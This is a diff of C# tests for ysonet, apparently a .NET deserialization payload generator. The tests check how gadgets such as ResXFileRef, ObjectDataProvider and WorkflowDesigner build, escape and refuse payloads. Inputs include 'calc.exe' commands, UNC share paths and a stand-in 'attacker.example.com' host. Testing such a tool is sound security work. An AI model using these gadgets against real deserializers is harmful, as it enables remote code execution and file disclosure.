+                    // And the framework's own parser must get all three fields back out.
+                    string[] parts = ResXFileRefFrameworkParse(delivered);
+                    AssertEqual(path, parts[0], desc + ": the target parses the path back");
+                    AssertEqual(typeName, parts[1].TrimStart(),
+                        desc + ": the target parses the type name back");
+                    if (encodingName.Length == 0)
+                        AssertEqual(2, parts.Length, desc + ": no encoding field is written");
+                    else
+                        AssertEqual(encodingName, parts[2], desc + ": the encoding field is written");
+                }
+            }
+        }
+
+        // "--variant 3 --type Some.Type, Some.Assembly" -> the argv the CLI would build. The
+        // type value is always the last argument, so everything after "--type" is one value.
+        private static string[] SplitVariantArgs(string raw)
+        {
+            const string typeFlag = "--type ";
+            int at = raw.IndexOf(typeFlag, StringComparison.Ordinal);
+            if (at < 0)
+                return raw.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
+
+            var args = new List<string>(raw.Substring(0, at)
+                .Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
+            args.Add("--type");
+            args.Add(raw.Substring(at + typeFlag.Length));
+            return args.ToArray();
+        }
+
+        // The refusals this gadget owns, and they are the only ones. Everything else about
+        // the operator's value is taken as typed (Generators/README.md, "Operator input:
+        // document it, do not police it") - no path shape, no extension, no assembly
+        // identity check on --type.
+        private static void ResXFileRefRefusesOnlyWhatItCannotEmit()
+        {
+            RunResult empty = GenerateResXFileRef("Xaml", "", false);
+            AssertTrue(!empty.Success, "an empty -c is refused");
+            AssertTrue((empty.ErrorMessage ?? "").IndexOf("non-empty -c", StringComparison.OrdinalIgnoreCase) >= 0,
+                "and the refusal names the input: " + empty.ErrorMessage);
+
+            RunResult noType = GenerateResXFileRef("Xaml", ResXFileRefSamplePath, false, "--variant", "3");
+            AssertTrue(!noType.Success, "variant 3 with no --type is refused rather than guessed");
+            AssertTrue((noType.ErrorMessage ?? "").IndexOf("--type", StringComparison.Ordinal) >= 0,
+                "and the refusal names the option: " + noType.ErrorMessage);
+
+            RunResult noVariant = GenerateResXFileRef("Xaml", ResXFileRefSamplePath, false, "--variant", "4");
+            AssertTrue(!noVariant.Success, "a variant number this gadget has no branch for is refused");
+            AssertTrue((noVariant.ErrorMessage ?? "").IndexOf("no variant 4", StringComparison.Ordinal) >= 0,
+                "and the refusal says so: " + noVariant.ErrorMessage);
+
+            // Each minifier rewrites a DIFFERENT shape, so each formatter gets the value its
+            // own minifier really corrupts - measured, not predicted. The XML one collapses
+            // "; " inside the text node but leaves a double space that sits behind a
+            // backslash alone; the YAML one collapses every run of whitespace.
+            var lossyValues = new Dictionary<string, string>
+            {
+                { "Xaml", @"C:\stage\a; b.resources" },
+                { "YamlDotNet", @"C:\two  spaces\stage.resources" },
+            };
+            foreach (string formatter in new[] { "Xaml", "YamlDotNet" })
+            {
+                string lossy = lossyValues[formatter];
+                RunResult minified = GenerateResXFileRef(formatter, lossy, true);
+                AssertTrue(!minified.Success, formatter + ": a path --minify would rewrite is refused");
+                AssertTrue((minified.ErrorMessage ?? "").IndexOf("--minify", StringComparison.Ordinal) >= 0
+                        && (minified.ErrorMessage ?? "").IndexOf(lossy, StringComparison.Ordinal) >= 0,
+                    formatter + ": the refusal names both the switch and the value: " + minified.ErrorMessage);
+
+                // The SAME value is fine without --minify, which is what proves the refusal
+                // is about the minifier and not about the character.
+                RunResult plain = GenerateResXFileRef(formatter, lossy, false);
+                AssertTrue(plain.Success,
+                    formatter + ": and the same value generates without --minify: " + plain.ErrorMessage);
+
+                // Shapes a validating gadget would have rejected and this one must not.
+                foreach (string odd in new[] { "not-a-path", @"..\relative\x", "x", @"\\host\share\a b&c'd",
+                    "/unix/style/path", "\u00e9\u00e8.resources" })
+                {
+                    RunResult r = GenerateResXFileRef(formatter, odd, false);
+                    AssertTrue(r.Success, formatter + " \"" + odd
+                        + "\" is the target's decision, not ysonet's: " + r.ErrorMessage);
+                }
+            }
+        }
+
+        // --rawinput turns the per-format escaping off, and with it the fidelity guard,
+        // because the operator has taken the escaping decision themselves.
+        private static void ResXFileRefRawInputSkipsTheEscaping()
+        {
+            const string ampersandPath = @"\\host\share\a&b.resources";
+
+            RunResult xaml = GenerateResXFileRef("Xaml", ampersandPath, false);
+            AssertTrue(xaml.Success, "the Xaml path generates: " + xaml.ErrorMessage);
+            AssertTrue(((string)xaml.Raw).IndexOf("&amp;", StringComparison.Ordinal) >= 0,
+                "and escapes the ampersand for the XML text node");
+
+            const string preEscaped = @"\\host\share\a&amp;b.resources";
+            RunResult xamlRaw = GenerateResXFileRef("Xaml", preEscaped, false, "--rawinput");
+            AssertTrue(xamlRaw.Success, "--rawinput generates: " + xamlRaw.ErrorMessage);
+            AssertTrue(((string)xamlRaw.Raw).IndexOf(preEscaped, StringComparison.Ordinal) >= 0,
+                "and passes an already-escaped value through untouched: " + xamlRaw.Raw);
+
+            // The YAML scalar is DOUBLE quoted, so the backslashes are doubled and an
+            // apostrophe must NOT become \' - that escape is illegal in a double quoted
+            // literal and one of this project's parsers deletes the character (see
+            // CommandArgSplitter.JsonDoubleQuotedStringEscape).
+            const string apostrophePath = @"C:\John's dir\stage.resources";
+            RunResult yaml = GenerateResXFileRef("YamlDotNet", apostrophePath, false);
+            AssertTrue(yaml.Success, "the YamlDotNet path generates: " + yaml.ErrorMessage);
+            string yamlText = (string)yaml.Raw;
+            AssertTrue(yamlText.IndexOf(@"C:\\John's dir\\stage.resources", StringComparison.Ordinal) >= 0,
+                "the backslashes are doubled for the double quoted scalar: " + yamlText);
+            AssertTrue(yamlText.IndexOf(@"\'", StringComparison.Ordinal) < 0,
+                "and the apostrophe is NOT escaped: " + yamlText);
+
+            RunResult yamlRaw = GenerateResXFileRef("YamlDotNet", apostrophePath, false, "--rawinput");
+            AssertTrue(yamlRaw.Success, "--rawinput generates: " + yamlRaw.ErrorMessage);
+            AssertTrue(((string)yamlRaw.Raw).IndexOf(apostrophePath, StringComparison.Ordinal) >= 0,
+                "and the single backslashes survive: " + yamlRaw.Raw);
+        }
+
+        // The formatter list is two long, and every exclusion is reproduced here rather than
+        // argued in a comment, because each one is a cell somebody could later "add" in good
+        // faith. The path in these probes does not exist, so a converter that DID run would
+        // throw a FileNotFoundException and the assertion would say so.
+        private static void ResXFileRefAdvertisesOnlyXamlAndYamlAndWhy()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(ResXFileRefGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+
+            List<string> formatters = g.SupportedFormatters();
+            AssertEqual(2, formatters.Count, "exactly two advertised formatters");
+            AssertEqual("Xaml (3)", formatters[0], "Xaml, annotated with its three variants");
+            AssertEqual("YamlDotNet < 5.0.0 (3)", formatters[1],
+                "and YamlDotNet, with the catalogue's version note and the same annotation");
+
+            Type target = typeof(System.Resources.ResXFileRef);
+            const string missing = @"C:\ysonet-no-such-file-resxfileref.txt";
+
+            // Reason 1: no parameterless constructor and no writable member, which is what
+            // every contract-building serializer needs.
+            AssertTrue(target.GetConstructor(Type.EmptyTypes) == null,
+                "ResXFileRef has no parameterless constructor");
+            foreach (string property in new[] { "FileName", "TypeName", "TextFileEncoding" })
+                AssertTrue(target.GetProperty(property).GetSetMethod() == null,
+                    property + " is read-only, so there is nothing to assign either");
+
+            Exception jss = null;
+            try
+            {
+                SerializersHelper.JavaScriptSerializer_deserialize(
+                    @"{""__type"":""System.Resources.ResXFileRef, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"",""FileName"":"""
+                    + missing.Replace(@"\", @"\\") + @"""}");
+            }
+            catch (Exception ex) { jss = ex; }
+            AssertTrue(jss != null, "JavaScriptSerializer refuses the type");
+            Exception jssRoot = jss;
+            while (jssRoot.InnerException != null) jssRoot = jssRoot.InnerException;
+            AssertTrue(jssRoot is MissingMethodException,
+                "and the reason is the missing parameterless constructor: " + jssRoot.GetType().Name
+                    + ": " + jssRoot.Message);
+
+            // Reason 2, the SILENT one and so the dangerous one: the runtime formatters
+            // rebuild the object from its FIELDS and never consult the converter, so this
+            // cell round-trips cleanly and reads no file at all.
+            var live = new System.Resources.ResXFileRef(missing, "System.String");
+            var bfStream = new MemoryStream();
+            new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter()
+                .Serialize(bfStream, live);
+            bfStream.Position = 0;
+            object rebuilt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter()
+                .Deserialize(bfStream);
+            var asFileRef = rebuilt as System.Resources.ResXFileRef;
+            AssertTrue(asFileRef != null,
+                "BinaryFormatter DOES rebuild the type, which is why this cell looks like it works");
+            AssertEqual(missing, asFileRef.FileName,
+                "but it is an inert ResXFileRef: the converter never ran and no file was opened");
+
+            // Reason 3: Json.NET has nowhere to declare the type. A JSON string at an object
+            // root is just a string, and there is no settable member of this type anywhere in
+            // the framework to name instead.
+            object jsonRoot = SerializersHelper.JsonNet_deserialize(
+                @"""" + missing.Replace(@"\", @"\\") + @"""");
+            AssertTrue(jsonRoot is string,
+                "a JSON string at an object root stays a string, so no converter is selected");
+
+            // Reason 4: SharpSerializer converts a simple value with Convert.ChangeType, not
+            // through TypeDescriptor, and it needs a parameterless constructor as well.
+            Exception sharp = null;
+            try
+            {
+                SerializersHelper.SharpSerializer_Xml_deserialize_FromString(
+                    @"<?xml version=""1.0"" encoding=""utf-8""?><Complex name=""r"" type=""System.Resources.ResXFileRef, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />");
+            }
+            catch (Exception ex) { sharp = ex; }
+            AssertTrue(sharp != null, "SharpSerializer refuses the type too");
+        }
+
+        // The one mitigation that stops this payload, stated as a fact and locked, rather
+        // than rediscovered. The failure is the SILENT kind, which is the part worth
+        // asserting: no exception, no file opened, just null.
+        private static void ResXFileRefIsDroppedByTheRestrictiveXamlReader()
+        {
+            // A path that does not exist, so a reader that DID reach the converter would
+            // throw FileNotFoundException instead of returning quietly.
+            RunResult r = GenerateResXFileRef("Xaml", @"C:\ysonet-no-such-file-restrictive.txt",
+                false, "--variant", "1");
+            AssertTrue(r.Success, "the payload generates: " + r.ErrorMessage);
+
+            object result = null;
+            Exception thrown = null;
+            try { result = SerializersHelper.Xaml_deserialize_restrictive((string)r.Raw); }
+            catch (Exception ex) { thrown = ex; }
+
+            AssertTrue(thrown == null,
+                "the restrictive reader does not throw: " + (thrown == null ? "" : thrown.Message));
+            AssertTrue(result == null,
+                "it returns null, having skipped the element's whole subtree, so nothing was read");
+        }
+
+        // The metadata an operator searches on. Each value has a reason a future edit could
+        // quietly break, so it is locked here rather than left to the generic audit table.
+        private static void ResXFileRefDeclaresItsFacets()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(ResXFileRefGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+
+            AssertEqual(CommandInputType.TargetPath, g.CommandInput(),
+                "-c is a path the TARGET opens; ysonet never touches it");
+
+            List<GadgetVariant> variants = g.Variants();
+            AssertEqual("1,2,3", string.Join(",", variants.ConvertAll(v => v.Number.ToString()).ToArray()),
+                "three contiguous variants");
+
+            // The gadget-level set describes the DEFAULT variant (2), which is the only one
+            // that inherits it, so it must NOT claim information disclosure - that is
+            // variant 1's alone. If this ever regressed, variant 2 would inherit a kind its
+            // effect does not have.
+            GadgetFacetSet gadgetFacets = g.Facets();
+            foreach (string kind in new[] { PayloadKind.FileSystem,
+                PayloadKind.NestedDeserialization, PayloadKind.CodeExecution, PayloadKind.Network })
+                AssertTrue(gadgetFacets.Kinds.Contains(kind), "the gadget declares " + kind);
+            AssertTrue(!gadgetFacets.Kinds.Contains(PayloadKind.InformationDisclosure),
+                "the default variant loads a .resources file and discloses nothing, so the "
+                    + "gadget set does not claim information-disclosure");
+            AssertTrue(!gadgetFacets.Kinds.Contains(PayloadKind.Other),
+                "and it is the concrete .resources effect, not 'other'");
+
+            // Inputs are DECLARED, not derived: an operator hunting for the UNC use has to
+            // find this gadget, and local-file must NOT appear - ysonet opens nothing.
+            AssertTrue(gadgetFacets.Inputs != null, "the inputs are declared rather than derived");
+            AssertTrue(gadgetFacets.Inputs.Contains(PayloadInput.TargetPath), "declares target-path");
+            AssertTrue(gadgetFacets.Inputs.Contains(PayloadInput.UncPath), "declares unc-path");
+            AssertTrue(!gadgetFacets.Inputs.Contains(PayloadInput.LocalFile),
+                "and NOT local-file: nothing is read on this machine while building");
+
+            // Variant 1 reads a file back and stops there.
+            GadgetFacetSet read = variants[0].FacetOverride;
+            AssertTrue(read != null, "variant 1 declares its own facets");
+            AssertTrue(read.Kinds.Contains(PayloadKind.InformationDisclosure),
+                "variant 1 recovers the file's content");
+            AssertTrue(!read.Kinds.Contains(PayloadKind.NestedDeserialization)
+                    && !read.Kinds.Contains(PayloadKind.CodeExecution),
+                "and claims neither a second deserializer nor code execution");
+
+            // Variant 2 is the gadget's own capability, so it inherits.
+            AssertTrue(variants[1].FacetOverride == null,
+                "variant 2 inherits the gadget set, which is exactly its capability");
+
+            // It is also the DEFAULT, and it is not the first listed, so it has to say so:
+            // the interactive editor pre-selects the declared default, and without the
+            // declaration it would offer variant 1 and build a different payload than the
+            // same command line does.
+            AssertTrue(variants[1].IsDefault, "variant 2 declares itself the default");
+            AssertTrue(!variants[0].IsDefault && !variants[2].IsDefault,
+                "and it is the only one that does");
+            var editor = new ModuleEditor(null, null, true, null, null);
+            editor.BuildFieldsForTest(ResXFileRefGadget);
+            List<string> editorArgs = editor.GadgetExtraArgvForTest();
+            AssertTrue(editorArgs.Contains("2") && !editorArgs.Contains("1"),
+                "and the editor pre-selects it: " + string.Join(" ", editorArgs.ToArray()));
+
+            // Variant 3 is a bring-your-own variant: the operator's type decides the effect,
+            // so it inherits NOTHING from variant 2's proven kinds.
+            GadgetFacetSet activate = variants[2].FacetOverride;
+            AssertTrue(activate != null, "variant 3 declares its own facets");
+            AssertTrue(activate.Kinds.Contains(PayloadKind.Other),
+                "variant 3 claims only 'other': the type the operator names decides the result");
+            foreach (string kind in new[] { PayloadKind.CodeExecution, PayloadKind.NestedDeserialization,
+                PayloadKind.InformationDisclosure })
+                AssertTrue(!activate.Kinds.Contains(kind),
+                    "variant 3 does not inherit " + kind + " from the built variant");
+
+            // Versions are evidence: the fire rows record what actually fired and
+            // VersionEvidenceMatchesThisRuntime fails the run when a claim and the
+            // observation disagree. An override replaces the WHOLE set, so each one repeats.
+            foreach (var facets in new[] { gadgetFacets, read, activate })
+            {
+                AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
+                    "a runtime-gated gadget names at least one working version");
+                AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
+                    "4.8.1 is the build the effect was observed on");
+            }
+
+            // Per-variant option scope: the editor must not offer --type on a variant whose
+            // type name is fixed, nor --enc where no text is read.
+            AssertTrue(!variants[0].UsesOption(ResXFileRefGenerator.TypeOptionName),
+                "variant 1 does not use --type");
+            AssertTrue(variants[0].UsesOption(ResXFileRefGenerator.EncodingOptionName),
+                "variant 1 is the one that uses --enc");
+            AssertTrue(!variants[1].UsesOption(ResXFileRefGenerator.TypeOptionName)
+                    && !variants[1].UsesOption(ResXFileRefGenerator.EncodingOptionName),
+                "variant 2 uses neither");
+            AssertTrue(variants[2].UsesOption(ResXFileRefGenerator.TypeOptionName)
+                    && !variants[2].UsesOption(ResXFileRefGenerator.EncodingOptionName),
+                "variant 3 uses --type and not --enc");
+
+            AssertTrue(g.AdditionalInfo().IndexOf("UNC", StringComparison.OrdinalIgnoreCase) >= 0,
+                "AdditionalInfo names the UNC use, which the facets alone do not explain");
+            AssertInfoPanelKeepsItsFacts(ResXFileRefGadget);
+        }
+
+        // -t is decided per VARIANT, and that split is the thing that regressed on
+        // WbemClassObjectUnmarshal: reading a file back is a self-test like any other, while
+        // deserializing or activating from the operator's own file inside ysonet is not.
+        // -t in ysonet is a self-exploit: it deserializes the payload HERE, so the converter
+        // runs on -c in this process. Every variant ACCEPTS it - variant 1 reads the file
+        // back, variant 2 runs a BinaryFormatter over the .resources you named, variant 3
+        // activates the type you named. (Your file, your machine: the maintainer's call.) The
+        // text fixture is not a real .resources, so variant 2's in-process BinaryFormatter
+        // throws and RunSelfTest swallows it - generation still succeeds, which is what "-t is
+        // accepted" means; the fire rows prove variant 2/3 really trigger against benign
+        // witnesses.
+        private static void ResXFileRefAcceptsSelfTestOnEveryVariant()
+        {
+            string fixture = WriteTestArtifact("ysonet_resxfileref_selftest.txt",
+                "ysonet ResXFileRef self-test fixture");
+            try
+            {
+                foreach (string formatter in new[] { "Xaml", "YamlDotNet" })
+                {
+                    foreach (int variant in new[] { 1, 2, 3 })
+                    {
+                        var extra = new List<string> { "--variant", variant.ToString() };
+                        if (variant == 3)
+                        {
+                            extra.Add("--type");
+                            extra.Add("System.IO.BufferedStream, mscorlib");
+                        }
+
+                        InputArgs ia = new InputArgs();
+                        ia.Cmd = fixture;
+                        ia.Test = true;
+                        ia.ExtraArguments = new List<string>(extra);
+                        RunResult tested = PayloadRunner.GenerateGadget(new GenerationRequest
+                        {
+                            GadgetName = ResXFileRefGadget,
+                            FormatterName = formatter,
+                            OutputFormat = "",
+                            InputArgs = ia,
+                        });
+                        AssertTrue(tested.Success,
+                            formatter + " v" + variant + ": -t is accepted (self-exploit): " + tested.ErrorMessage);
+                        AssertTrue((tested.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) < 0,
+                            formatter + " v" + variant + ": no -t refusal remains: " + tested.ErrorMessage);
+
+                        RunResult untested = GenerateResXFileRef(formatter, fixture, false, extra.ToArray());
+                        AssertEqual(untested.Raw as string, tested.Raw as string,
+                            formatter + " v" + variant + ": -t ships the same payload it self-tested");
+                    }
+                }
+            }
+            finally
+            {
+                SafeDelete(fixture);
+            }
+        }
+
+        // A gadget with a variant that refuses -t (WithoutSelfTest) must not dead-end the
+        // interactive editor: with the shared "test" toggle carried over ON from another
+        // module, pressing Generate on that variant would hit the gadget's -t refusal and
+        // produce no payload. The editor hides "test" for such a variant and never emits it,
+        // so Generate builds the payload; the CLI is unchanged (a scripted -t still refuses).
+        //
+        // WbemClassObjectUnmarshal is the case that still exercises this: variant 2 refuses
+        // -t (unparsed operator blob into native COM), variant 1 (its default) accepts it.
+        // ResXFileRef used to refuse -t on variants 2/3 and is checked here too, now that it
+        // accepts -t on EVERY variant - the toggle must be visible throughout, proving the
+        // scoping does not hide it for a gadget that does not declare WithoutSelfTest.
+        private static void EditorHidesTheTestToggleForARefusingVariant()
+        {
+            // WbemClassObjectUnmarshal: variant 1 (default) accepts -t, variant 2 refuses it,
+            // so the editor keeps the toggle on 1 and hides it on 2.
+            var wbem = new ModuleEditor(null, null, true, null, null);
+            var wfields = wbem.BuildFieldsForTest("WbemClassObjectUnmarshal");
+            EditableField wtest = FindEditable(wfields, "test");
+            EditableField wvariant = FindEditable(wfields, "variant");
+            EditableField wcommand = FindEditable(wfields, "command");
+            if (wcommand != null) wcommand.Value = "attacker.example.com";
+            wtest.Value = "true";
+            List<GadgetVariant> wdeclared = Gadget("WbemClassObjectUnmarshal").Variants();
+
+            wvariant.Value = wdeclared[0].Label; // variant 1 (default): accepts -t
+            string w1 = wbem.GadgetCommandLineForTest();
+            AssertTrue(!wtest.Hidden && w1.Contains("--test"),
+                "WbemClassObjectUnmarshal variant 1 keeps the test toggle: " + w1);
+
+            wvariant.Value = wdeclared[1].Label; // variant 2: refuses -t
+            string w2 = wbem.GadgetCommandLineForTest();
+            AssertTrue(wtest.Hidden && !w2.Contains("--test"),
+                "WbemClassObjectUnmarshal variant 2 hides the test toggle: " + w2);
+
+            // ResXFileRef now accepts -t on every variant (self-exploit runs the converter
+            // here), so NONE of its variants declares WithoutSelfTest and the toggle must stay
+            // visible and emitted throughout - the scoping only hides it where a variant
+            // really refuses -t.
+            var rx = new ModuleEditor(null, null, true, null, null);
+            var rfields = rx.BuildFieldsForTest(ResXFileRefGadget);
+            EditableField rtest = FindEditable(rfields, "test");
+            EditableField rvariant = FindEditable(rfields, "variant");
+            EditableField rcommand = FindEditable(rfields, "command");
+            if (rcommand != null) rcommand.Value = @"\\host\share\stage.resources";
+            rtest.Value = "true";
+            foreach (GadgetVariant v in Gadget(ResXFileRefGadget).Variants())
+            {
+                rvariant.Value = v.Label;
+                if (v.Number == ResXFileRefGenerator.VariantActivateNamedType)
+                {
+                    EditableField rtype = FindEditable(rfields, ResXFileRefGenerator.TypeOptionName);
+                    if (rtype != null) rtype.Value = "System.IO.BufferedStream, mscorlib";
+                }
+                string line = rx.GadgetCommandLineForTest();
+                AssertTrue(!rtest.Hidden,
+                    "ResXFileRef variant " + v.Number + " keeps the test toggle visible");
+                AssertTrue(line.Contains("--test"),
+                    "ResXFileRef variant " + v.Number + " emits --test when it is on: " + line);
+            }
+        }
+
+        // The Resx plugin reaches the SAME converter through a RESX document, and its
+        // indirect_resx_file mode now exposes the type name and the encoding. Two things must
+        // hold: an existing command's output is byte-identical, and the new options change
+        // nothing but that one value.
+        private static void ResxPluginIndirectFileRefKeepsItsDefaultAndAcceptsTypeAndEncoding()
+        {
+            const string share = @"\\host\share\stage.resources";
+
+            // The exact value this mode has always written. Asserted as a literal on purpose:
+            // a default that drifts has to fail loudly, because every existing command
+            // depends on it.
+            const string expectedDefault = @"\\host\share\stage.resources; System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
+
+            string byDefault = ResxIndirectValue(new[] { "-M", "indirect_resx_file", "-F", share });
+            AssertEqual(expectedDefault, byDefault,
+                "the default indirect_resx_file value is unchanged");
+
+            string asText = ResxIndirectValue(new[] { "-M", "indirect_resx_file", "-F", share,
+                "--type", "System.String", "--enc", "utf-8" });
+            AssertEqual(share + "; System.String;utf-8", asText,
+                "--type and --enc change only the type name and add the encoding field");
+
+            // The composition follows ResXFileRef.ToString(), so a path holding the field
+            // separator is quoted - which the old fixed value never did.
+            const string semicolonPath = @"C:\stage;01\payload.resources";
+            string quoted = ResxIndirectValue(new[] { "-M", "indirect_resx_file", "-F", semicolonPath });
+            AssertTrue(quoted.StartsWith("\"" + semicolonPath + "\";", StringComparison.Ordinal),
+                "a path containing ';' is quoted: " + quoted);
+            string[] parts = ResXFileRefFrameworkParse(quoted);
+            AssertEqual(semicolonPath, parts[0],
+                "and the framework's own parser gets the path back out");
+
+            // A run with no --type after a run with one must be the default again: the option
+            // set writes into statics and the plugin is driven repeatedly in one process.
+            string againByDefault = ResxIndirectValue(new[] { "-M", "indirect_resx_file", "-F", share });
+            AssertEqual(expectedDefault, againByDefault,
+                "the option does not leak into the next run in the same process");
+
+            // The other modes are untouched: the same arguments plus --type build the same
+            // payload, because --type belongs to indirect_resx_file alone.
+            ResetPluginStatics(typeof(ResxPlugin));
+            RunResult plainMode = PayloadRunner.RunPlugin("Resx",
+                new[] { "-M", "indirect_resx_file", "-F", share });
+            ResetPluginStatics(typeof(ResxPlugin));
+            RunResult withType = PayloadRunner.RunPlugin("Resx",
+                new[] { "-M", "indirect_resx_file", "-F", share, "--type", "System.String" });
+            AssertTrue(plainMode.Success && withType.Success, "both runs generate");
+            AssertTrue(Convert.ToString(plainMode.Raw) != Convert.ToString(withType.Raw),
+                "--type really changes the indirect_resx_file document");
+        }
+
+        // The <value> of the one <data> element a Resx run emits.
+        private static string ResxIndirectValue(string[] argv)
+        {
+            ResetPluginStatics(typeof(ResxPlugin));
+            RunResult r = PayloadRunner.RunPlugin("Resx", argv);
+            AssertTrue(r.Success, "Resx " + string.Join(" ", argv) + ": " + r.ErrorMessage);
+
+            string document = Convert.ToString(r.Raw);
+            var doc = new System.Xml.XmlDocument();
+            doc.LoadXml(document);
+            System.Xml.XmlNode value = doc.SelectSingleNode("/root/data[@name='x']/value");
+            AssertTrue(value != null, "the document carries the data element: " + document);
+            return value.InnerText;
+        }
+
+        // TWO payloads left ObjectDataProvider, and the numbers they used are NOT reused.
+        // Variant 3 was the "ResourceDictionary Source=URL" fetch and variant 4 was the
+        // WorkflowDesigner wrapper; each is its own gadget now. What must hold afterwards: the
+        // gadget is left with variants 1 and 2, the option that fed the URL payload is gone,
+        // the annotation matches, and BOTH retired numbers refuse by NAME instead of quietly
+        // falling through to variant 1 - which is the failure this test exists to prevent,
+        // because a scripted --var 4 would otherwise ship a completely different payload with
+        // nothing to notice.
+        private static void ObjectDataProviderRetiredVariantsMovedToTheirOwnGadgets()
+        {
+            var odp = GadgetRegistry.CreateGadgetInstance("ObjectDataProvider") as GenericGenerator;
+            AssertTrue(odp != null, "ObjectDataProvider loads");
+
+            List<GadgetVariant> variants = odp.Variants();
+            AssertEqual("1,2", string.Join(",", variants.ConvertAll(v => v.Number.ToString()).ToArray()),
+                "two contiguous variants are left");
+
+            // Variant 2 still builds the ResourceDictionary CONTAINER shape, which stayed here
+            // because its sink is still ObjectDataProvider's.
+            RunResult v2 = GenerateOdpXamlVariant(2);
+            AssertTrue(v2.Success, "Xaml variant 2 still builds: " + v2.ErrorMessage);
+            AssertTrue(((string)v2.Raw).IndexOf("ResourceDictionary", StringComparison.Ordinal) >= 0,
+                "and it is still the ResourceDictionary container wrapper");
+
+            // The two retired numbers refuse, and each message names its replacement gadget.
+            RunResult v3 = GenerateOdpXamlVariant(3);
+            AssertTrue(!v3.Success, "variant 3 is refused rather than silently built");
+            AssertTrue(v3.ErrorMessage.IndexOf("ResourceDictionary", StringComparison.Ordinal) >= 0,
+                "and the message names the ResourceDictionary gadget: " + v3.ErrorMessage);
+
+            RunResult v4 = GenerateOdpXamlVariant(4);
+            AssertTrue(!v4.Success, "variant 4 is refused rather than silently built");
+            AssertTrue(v4.ErrorMessage.IndexOf("WorkflowDesigner", StringComparison.Ordinal) >= 0,
+                "and the message names the WorkflowDesigner gadget: " + v4.ErrorMessage);
+
+            // A retired number must be refused on EVERY formatter, not only the Xaml one it
+            // used to live on: the number is parsed before the formatter branch is chosen, so a
+            // guard placed inside the Xaml block would let "-f Json.NET --var 4" through.
+            InputArgs jsonArgs = new InputArgs();
+            jsonArgs.Cmd = "calc.exe";
+            jsonArgs.Test = false;
+            jsonArgs.ExtraArguments = new List<string> { "--variant", "4" };
+            RunResult jsonV4 = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "ObjectDataProvider",
+                FormatterName = "Json.NET",
+                OutputFormat = "",
+                InputArgs = jsonArgs,
+            });
+            AssertTrue(!jsonV4.Success,
+                "a retired variant is refused on a non-Xaml formatter too");
+
+            // --xamlurl left with the payload; the URI is now an ordinary -c on the new gadget.
+            AssertTrue(OptionField.FromOptionSet(odp.Options()).Count == 1,
+                "ObjectDataProvider is left with one option, --variant");
+
+            // The "(N)" annotation is a per-formatter variant COUNT and is the only place the
+            // public catalog discloses that a gadget has variants at all.
+            AssertTrue(odp.SupportedFormatters().Contains("Xaml (2)"),
+                "the Xaml token is annotated with two variants: "
+                    + string.Join(", ", odp.SupportedFormatters().ToArray()));
+
+            AssertTrue(GadgetRegistry.CreateGadgetInstance(RdGadget) != null,
+                "and the gadget that took over the URL payload is registered");
+            AssertTrue(GadgetRegistry.CreateGadgetInstance(WdGadget) != null,
+                "and the gadget that took over the wrapper is registered");
+        }
+
+        private static RunResult GenerateOdpXamlVariant(int variant)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.Test = false;
+            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "ObjectDataProvider",
+                FormatterName = "Xaml",
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // ---- WorkflowDesigner (write-only member -> XamlReader.Load) -------------
+
+        private const string WdGadget = "WorkflowDesigner";
+
+        // Every formatter this gadget advertises, with the deserializer tag the fire and
+        // round-trip helpers use. One list, so a formatter added to the gadget and forgotten
+        // here fails WorkflowDesignerCoversEveryAdvertisedFormatter below.
+        private static readonly string[][] WorkflowDesignerFormatters =
+        {
+            new[] { "Json.NET", "json" },
+            new[] { "Xaml", "xaml" },
+            new[] { "FastJson", "fastjson" },
+            new[] { "JavaScriptSerializer", "jss" },
+            new[] { "SharpSerializerXml", "ssx" },
+            new[] { "SharpSerializerBinary", "ssb" },
+            new[] { "MessagePackTypeless", "mp" },
+            new[] { "MessagePackTypelessLz4", "mplz4" },
+        };
+
+        private static RunResult GenerateWorkflowDesigner(string formatter, bool minify, string cmd)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = cmd;
+            ia.Test = false;
+            ia.Minify = minify;
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = WdGadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // Generation for every advertised formatter x minify, and - the half a generation
+        // matrix cannot check - that the emitted bytes really CARRY the inner XAML document.
+        // Two of these formatters ship a surrogate through a type-name swap, and that swap
+        // failing is silent: the payload is still valid MessagePack or SharpSerializer, it just
+        // names a ysonet type no target can resolve.
+        private static void WorkflowDesignerCarriesTheInnerDocument()
+        {
+            var failures = new List<string>();
+            foreach (string[] row in WorkflowDesignerFormatters)
+            {
+                string formatter = row[0];
+                for (int m = 0; m < 2; m++)
+                {
+                    bool minify = m == 1;
+                    string cell = formatter + (minify ? " (minified)" : "");
+                    RunResult r = GenerateWorkflowDesigner(formatter, minify, "calc.exe");
+                    if (!r.Success || RawIsEmpty(r.Raw))
+                    {
+                        failures.Add(cell + " -> " + (r.Success ? "empty" : r.ErrorMessage));
+                        continue;
+                    }
+
+                    string text = Encoding.UTF8.GetString(Bytes(r.Raw));
+
+                    // The Lz4 flavour is COMPRESSED, so nothing is readable in its bytes; its
+                    // uncompressed twin covers the name, and its fire row covers the rest.
+                    if (formatter == "MessagePackTypelessLz4")
